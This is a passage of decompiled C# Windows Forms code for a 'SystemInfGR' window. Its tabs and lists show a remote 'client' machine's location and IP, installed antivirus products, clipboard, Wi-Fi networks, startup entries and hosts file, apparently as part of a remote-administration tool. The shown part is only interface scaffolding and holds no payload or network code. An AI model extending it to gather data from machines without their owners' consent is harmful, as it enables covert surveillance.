		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList6 = value;
		}
	}

	internal virtual StatusStrip StatusStrip7
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip7 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel7 = value;
		}
	}

	internal virtual TabPage TabPage10
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader18
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader18 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip4 = value;
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem1_Click;
			if (_RefreshToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem1).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem1 = value;
			if (_RefreshToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveToolStripMenuItem_Click;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoveToolStripMenuItem = value;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip5 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem7_Click;
			if (_ToolStripMenuItem7 != null)
			{
				((ToolStripItem)_ToolStripMenuItem7).remove_Click(eventHandler);
			}
			_ToolStripMenuItem7 = value;
			if (_ToolStripMenuItem7 != null)
			{
				((ToolStripItem)_ToolStripMenuItem7).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem8_Click;
			if (_ToolStripMenuItem8 != null)
			{
				((ToolStripItem)_ToolStripMenuItem8).remove_Click(eventHandler);
			}
			_ToolStripMenuItem8 = value;
			if (_ToolStripMenuItem8 != null)
			{
				((ToolStripItem)_ToolStripMenuItem8).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip8
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip8 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel8 = value;
		}
	}

	internal virtual ListView ListView5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListView5 = value;
		}
	}

	internal virtual ListView ListView4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(ListView4_ColumnClick);
			if (_ListView4 != null)
			{
				_ListView4.remove_ColumnClick(val);
			}
			_ListView4 = value;
			if (_ListView4 != null)
			{
				_ListView4.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader14
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader14 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader15
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader15 = value;
		}
	}

	internal virtual ListView ListView1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			DrawListViewSubItemEventHandler val = new DrawListViewSubItemEventHandler(ListView1_DrawSubItem);
			if (_ListView1 != null)
			{
				_ListView1.remove_DrawSubItem(val);
			}
			_ListView1 = value;
			if (_ListView1 != null)
			{
				_ListView1.add_DrawSubItem(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	[DebuggerNonUserCode]
	public SystemInfGR()
	{
		((Form)this).add_Load((EventHandler)Systeminformation_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Expected O, but got Unknown
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Expected O, but got Unknown
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected O, but got Unknown
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Expected O, but got Unknown
		//IL_01ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Expected O, but got Unknown
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Expected O, but got Unknown
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d8: Expected O, but got Unknown
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ee: Expected O, but got Unknown
		//IL_01ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f9: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_0242: Expected O, but got Unknown
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Expected O, but got Unknown
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_025f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Expected O, but got Unknown
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Expected O, but got Unknown
		//IL_027b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0285: Expected O, but got Unknown
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_0290: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b1: Expected O, but got Unknown
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bc: Expected O, but got Unknown
		//IL_02bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d2: Expected O, but got Unknown
		//IL_02d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02dd: Expected O, but got Unknown
		//IL_02de: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fe: Expected O, but got Unknown
		//IL_02ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0309: Expected O, but got Unknown
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0314: Expected O, but got Unknown
		//IL_0315: Unknown result type (might be due to invalid IL or missing references)
		//IL_031f: Expected O, but got Unknown
		//IL_0320: Unknown result type (might be due to invalid IL or missing references)
		//IL_032a: Expected O, but got Unknown
		//IL_032b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0335: Expected O, but got Unknown
		//IL_0336: Unknown result type (might be due to invalid IL or missing references)
		//IL_0340: Expected O, but got Unknown
		//IL_0341: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Expected O, but got Unknown
		//IL_034c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0356: Expected O, but got Unknown
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_0361: Expected O, but got Unknown
		//IL_0362: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Expected O, but got Unknown
		//IL_036d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0377: Expected O, but got Unknown
		//IL_0378: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Expected O, but got Unknown
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_038e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0398: Expected O, but got Unknown
		//IL_0399: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a3: Expected O, but got Unknown
		//IL_03a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ae: Expected O, but got Unknown
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b9: Expected O, but got Unknown
		//IL_03ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c4: Expected O, but got Unknown
		//IL_03c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cf: Expected O, but got Unknown
		//IL_03d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03da: Expected O, but got Unknown
		//IL_03db: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e5: Expected O, but got Unknown
		//IL_03e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f0: Expected O, but got Unknown
		//IL_03f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fb: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		//IL_0407: Unknown result type (might be due to invalid IL or missing references)
		//IL_0411: Expected O, but got Unknown
		//IL_0412: Unknown result type (might be due to invalid IL or missing references)
		//IL_041c: Expected O, but got Unknown
		//IL_041d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0427: Expected O, but got Unknown
		//IL_0428: Unknown result type (might be due to invalid IL or missing references)
		//IL_0432: Expected O, but got Unknown
		//IL_0433: Unknown result type (might be due to invalid IL or missing references)
		//IL_043d: Expected O, but got Unknown
		//IL_043e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0448: Expected O, but got Unknown
		//IL_0449: Unknown result type (might be due to invalid IL or missing references)
		//IL_0453: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Expected O, but got Unknown
		//IL_045f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0469: Expected O, but got Unknown
		//IL_046a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0474: Expected O, but got Unknown
		//IL_0475: Unknown result type (might be due to invalid IL or missing references)
		//IL_047f: Expected O, but got Unknown
		//IL_0480: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Expected O, but got Unknown
		//IL_048b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0495: Expected O, but got Unknown
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_04a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ab: Expected O, but got Unknown
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b6: Expected O, but got Unknown
		//IL_04b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c1: Expected O, but got Unknown
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cc: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		//IL_04d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e2: Expected O, but got Unknown
		//IL_04e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ed: Expected O, but got Unknown
		//IL_04ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f8: Expected O, but got Unknown
		//IL_04f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0503: Expected O, but got Unknown
		//IL_0504: Unknown result type (might be due to invalid IL or missing references)
		//IL_050e: Expected O, but got Unknown
		//IL_050f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Expected O, but got Unknown
		//IL_051a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0524: Expected O, but got Unknown
		//IL_0525: Unknown result type (might be due to invalid IL or missing references)
		//IL_052f: Expected O, but got Unknown
		//IL_0530: Unknown result type (might be due to invalid IL or missing references)
		//IL_053a: Expected O, but got Unknown
		//IL_053b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0545: Expected O, but got Unknown
		//IL_0546: Unknown result type (might be due to invalid IL or missing references)
		//IL_0550: Expected O, but got Unknown
		//IL_0551: Unknown result type (might be due to invalid IL or missing references)
		//IL_055b: Expected O, but got Unknown
		//IL_055c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0566: Expected O, but got Unknown
		//IL_0567: Unknown result type (might be due to invalid IL or missing references)
		//IL_0571: Expected O, but got Unknown
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Expected O, but got Unknown
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c4: Expected O, but got Unknown
		//IL_0aeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Expected O, but got Unknown
		//IL_0c13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c1d: Expected O, but got Unknown
		//IL_0d99: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da3: Expected O, but got Unknown
		//IL_0f03: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0d: Expected O, but got Unknown
		//IL_1359: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13f3: Expected O, but got Unknown
		//IL_175f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1769: Expected O, but got Unknown
		//IL_17b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1945: Unknown result type (might be due to invalid IL or missing references)
		//IL_194f: Expected O, but got Unknown
		//IL_1be4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c88: Expected O, but got Unknown
		//IL_2027: Unknown result type (might be due to invalid IL or missing references)
		//IL_21b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_21bb: Expected O, but got Unknown
		//IL_2357: Unknown result type (might be due to invalid IL or missing references)
		//IL_23d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_23de: Expected O, but got Unknown
		//IL_2584: Unknown result type (might be due to invalid IL or missing references)
		//IL_2891: Unknown result type (might be due to invalid IL or missing references)
		//IL_289b: Expected O, but got Unknown
		//IL_29e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a86: Expected O, but got Unknown
		//IL_2b43: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bf8: Expected O, but got Unknown
		//IL_2de4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f46: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f50: Expected O, but got Unknown
		//IL_308d: Unknown result type (might be due to invalid IL or missing references)
		//IL_310a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3114: Expected O, but got Unknown
		//IL_3287: Unknown result type (might be due to invalid IL or missing references)
		//IL_3291: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(SystemInfGR));
		ListViewItem val = new ListViewItem(new string[2] { "Country", "--" }, -1);
		ListViewItem val2 = new ListViewItem(new string[2] { "Country Code", "--" }, -1);
		ListViewItem val3 = new ListViewItem(new string[2] { "Region", "--" }, -1);
		ListViewItem val4 = new ListViewItem(new string[2] { "Region Name", "--" }, -1);
		ListViewItem val5 = new ListViewItem(new string[2] { "City", "--" }, -1);
		ListViewItem val6 = new ListViewItem(new string[2] { "Latitude", "--" }, -1);
		ListViewItem val7 = new ListViewItem(new string[2] { "Longitude", "--" }, -1);
		ListViewItem val8 = new ListViewItem(new string[2] { "Timezone", "--" }, -1);
		ListViewItem val9 = new ListViewItem(new string[2] { "IP Address", "--" }, -1);
		ImageList1 = new ImageList(components);
		ImageList2 = new ImageList(components);
		ImageList5 = new ImageList(components);
		ContextMenuStrip1 = new ContextMenuStrip(components);
		RefreshToolStripMenuItem = new ToolStripMenuItem();
		UninstallToolStripMenuItem = new ToolStripMenuItem();
		ImageList4 = new ImageList(components);
		ContextMenuStrip2 = new ContextMenuStrip(components);
		ToolStripMenuItem1 = new ToolStripMenuItem();
		ToolStripMenuItem2 = new ToolStripMenuItem();
		ToolStripMenuItem3 = new ToolStripMenuItem();
		ImageList3 = new ImageList(components);
		ContextMenuStrip4 = new ContextMenuStrip(components);
		RefreshToolStripMenuItem1 = new ToolStripMenuItem();
		RemoveToolStripMenuItem = new ToolStripMenuItem();
		ImageList6 = new ImageList(components);
		ContextMenuStrip5 = new ContextMenuStrip(components);
		ToolStripMenuItem7 = new ToolStripMenuItem();
		ToolStripMenuItem8 = new ToolStripMenuItem();
		ContextMenuStrip3 = new ContextMenuStrip(components);
		ToolStripMenuItem4 = new ToolStripMenuItem();
		ToolStripMenuItem5 = new ToolStripMenuItem();
		ToolStripMenuItem6 = new ToolStripMenuItem();
		EtherealTabControl1 = new EtherealTabControl();
		TabPage1 = new TabPage();
		ListView1 = new ListView();
		ColumnHeader1 = new ColumnHeader();
		Panel1 = new Panel();
		clearpcinf = new Button();
		refpcinf = new Button();
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		TabPage2 = new TabPage();
		PM = new PictureBox();
		Panel5 = new Panel();
		ListView3 = new ListView();
		ColumnHeader12 = new ColumnHeader();
		ColumnHeader13 = new ColumnHeader();
		Panel4 = new Panel();
		RFM = new Button();
		TabPage3 = new TabPage();
		AVLIST = new ListView();
		ColumnHeader10 = new ColumnHeader();
		ColumnHeader11 = new ColumnHeader();
		Panel3 = new Panel();
		CAVLIST = new Button();
		AVRE = new Button();
		StatusStrip4 = new StatusStrip();
		ToolStripStatusLabel4 = new ToolStripStatusLabel();
		TabPage4 = new TabPage();
		StatusStrip3 = new StatusStrip();
		ToolStripStatusLabel3 = new ToolStripStatusLabel();
		ListView2 = new ListView();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader6 = new ColumnHeader();
		ColumnHeader7 = new ColumnHeader();
		ColumnHeader8 = new ColumnHeader();
		ColumnHeader9 = new ColumnHeader();
		TabPage5 = new TabPage();
		Textc = new TextBox();
		StatusStrip5 = new StatusStrip();
		ToolStripStatusLabel5 = new ToolStripStatusLabel();
		TabPage6 = new TabPage();
		Panel2 = new Panel();
		CWL = new Button();
		RWL = new Button();
		StatusStrip2 = new StatusStrip();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		WIL = new ListView();
		ColumnHeader3 = new ColumnHeader();
		ColumnHeader4 = new ColumnHeader();
		ColumnHeader5 = new ColumnHeader();
		TabPage7 = new TabPage();
		TabControl1 = new TabControl();
		TabPage9 = new TabPage();
		ListView4 = new ListView();
		ColumnHeader14 = new ColumnHeader();
		ColumnHeader15 = new ColumnHeader();
		StatusStrip7 = new StatusStrip();
		ToolStripStatusLabel7 = new ToolStripStatusLabel();
		TabPage10 = new TabPage();
		StatusStrip8 = new StatusStrip();
		ToolStripStatusLabel8 = new ToolStripStatusLabel();
		ListView5 = new ListView();
		ColumnHeader18 = new ColumnHeader();
		TabPage8 = new TabPage();
		HostsText = new TextBox();
		StatusStrip6 = new StatusStrip();
		ToolStripStatusLabel6 = new ToolStripStatusLabel();
		((Control)ContextMenuStrip1).SuspendLayout();
		((Control)ContextMenuStrip2).SuspendLayout();
		((Control)ContextMenuStrip4).SuspendLayout();
		((Control)ContextMenuStrip5).SuspendLayout();
		((Control)ContextMenuStrip3).SuspendLayout();
		((Control)EtherealTabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)StatusStrip1).SuspendLayout();
		((Control)TabPage2).SuspendLayout();
		((ISupportInitialize)PM).BeginInit();
		((Control)Panel5).SuspendLayout();
		((Control)Panel4).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)StatusStrip4).SuspendLayout();
		((Control)TabPage4).SuspendLayout();
		((Control)StatusStrip3).SuspendLayout();
		((Control)TabPage5).SuspendLayout();
		((Control)StatusStrip5).SuspendLayout();
		((Control)TabPage6).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)StatusStrip2).SuspendLayout();
		((Control)TabPage7).SuspendLayout();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage9).SuspendLayout();
		((Control)StatusStrip7).SuspendLayout();
		((Control)TabPage10).SuspendLayout();
		((Control)StatusStrip8).SuspendLayout();
		((Control)TabPage8).SuspendLayout();
		((Control)StatusStrip6).SuspendLayout();
		((Control)this).SuspendLayout();
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "pcinf.png");
		ImageList1.get_Images().SetKeyName(1, "clientmap.png");
		ImageList1.get_Images().SetKeyName(2, "antiv.png");
		ImageList1.get_Images().SetKeyName(3, "uninst.png");
		ImageList1.get_Images().SetKeyName(4, "clipboard.png");
		ImageList1.get_Images().SetKeyName(5, "wifi.png");
		ImageList1.get_Images().SetKeyName(6, "start.png");
		ImageList1.get_Images().SetKeyName(7, "host.png");
		ImageList2.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList2.ImageStream"));
		ImageList2.set_TransparentColor(Color.Transparent);
		ImageList2.get_Images().SetKeyName(0, "1484946779_folder.png");
		ImageList2.get_Images().SetKeyName(1, "1484946805_Student-id-24.png");
		ImageList2.get_Images().SetKeyName(2, "1484946868_world.png");
		ImageList2.get_Images().SetKeyName(3, "1484947004_network-server.png");
		ImageList2.get_Images().SetKeyName(4, "1484954135_Internet_online_network_connection_intranet.png");
		ImageList2.get_Images().SetKeyName(5, "Device-Hard-Drive-Mac-icon.png");
		ImageList2.get_Images().SetKeyName(6, "1484954430_Windows.png");
		ImageList2.get_Images().SetKeyName(7, "1484954492_Internet_profile_website_user_computer.png");
		ImageList2.get_Images().SetKeyName(8, "Admin-icon.png");
		ImageList2.get_Images().SetKeyName(9, "Apps-preferences-system-time-icon.png");
		ImageList2.get_Images().SetKeyName(10, "firewall-icon.png");
		ImageList2.get_Images().SetKeyName(11, "1484955689_49_Windows.png");
		ImageList2.get_Images().SetKeyName(12, "monitor-test-icon.png");
		ImageList2.get_Images().SetKeyName(13, "1484955920_stock_connect.png");
		ImageList2.get_Images().SetKeyName(14, "Logitech-V470-Mouse-icon.png");
		ImageList2.get_Images().SetKeyName(15, "Devices-input-keyboard-icon.png");
		ImageList2.get_Images().SetKeyName(16, "Devices-audio-card-icon.png");
		ImageList2.get_Images().SetKeyName(17, "Device-RAM-icon.png");
		ImageList2.get_Images().SetKeyName(18, "Status-battery-missing-icon.png");
		ImageList2.get_Images().SetKeyName(19, "Hardware-Chip-icon.png");
		ImageList2.get_Images().SetKeyName(20, "bios-icon.png");
		ImageList2.get_Images().SetKeyName(21, "Status-battery-charging-080-icon.png");
		ImageList2.get_Images().SetKeyName(22, "Nod-32-icon.png");
		ImageList2.get_Images().SetKeyName(23, "Kasper-SZ-icon.png");
		ImageList2.get_Images().SetKeyName(24, "AVG-icon.png");
		ImageList2.get_Images().SetKeyName(25, "Avast-Antivirus-icon.png");
		ImageList2.get_Images().SetKeyName(26, "McAfee-Security-Center-icon.png");
		ImageList2.get_Images().SetKeyName(27, "1484967506_product-design.png");
		ImageList2.get_Images().SetKeyName(28, "Bitdefender-SZ-icon.png");
		ImageList2.get_Images().SetKeyName(29, "Status-battery-080-icon.png");
		ImageList2.get_Images().SetKeyName(30, "Status-battery-charging-060-icon.png");
		ImageList2.get_Images().SetKeyName(31, "Status-battery-060-icon.png");
		ImageList2.get_Images().SetKeyName(32, "Status-battery-charging-040-icon.png");
		ImageList2.get_Images().SetKeyName(33, "Status-battery-caution-icon.png");
		ImageList5.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList5.ImageStream"));
		ImageList5.set_TransparentColor(Color.Transparent);
		ImageList5.get_Images().SetKeyName(0, "1485730670_Windows_Defender.png");
		((ToolStrip)ContextMenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)RefreshToolStripMenuItem,
			(ToolStripItem)UninstallToolStripMenuItem
		});
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip1;
		Size size = new Size(121, 48);
		((Control)contextMenuStrip).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Image((Image)(object)Resources._1484270709_view_refresh);
